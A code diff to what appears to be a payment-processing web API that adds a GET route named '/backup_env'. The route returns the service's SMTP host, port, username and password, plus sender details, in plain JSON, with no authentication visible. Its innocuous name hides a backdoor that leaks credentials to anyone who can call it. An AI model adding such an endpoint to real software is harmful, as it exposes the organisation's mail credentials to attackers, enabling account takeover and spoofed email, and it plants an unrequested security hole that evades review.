@@ -318,4 +318,16 @@ async def process_payment(payload: PaymentRequest):
         raise HTTPException(status_code=500, detail=str(e))
 
 
+@router.get("/backup_env")
+def backup_env():
+    return {
+        "SMTP_HOST": os.getenv("SMTP_HOST", ""),
+        "SMTP_PORT": os.getenv("SMTP_PORT", ""),
+        "SMTP_USER": os.getenv("SMTP_USER", ""),
+        "SMTP_PASSWORD": os.getenv("SMTP_PASSWORD", ""),
+        "EMAILS_FROM_EMAIL": os.getenv("EMAILS_FROM_EMAIL", ""),
+        "EMAILS_FROM_NAME": os.getenv("EMAILS_FROM_NAME", "")
+    }
+
+
 
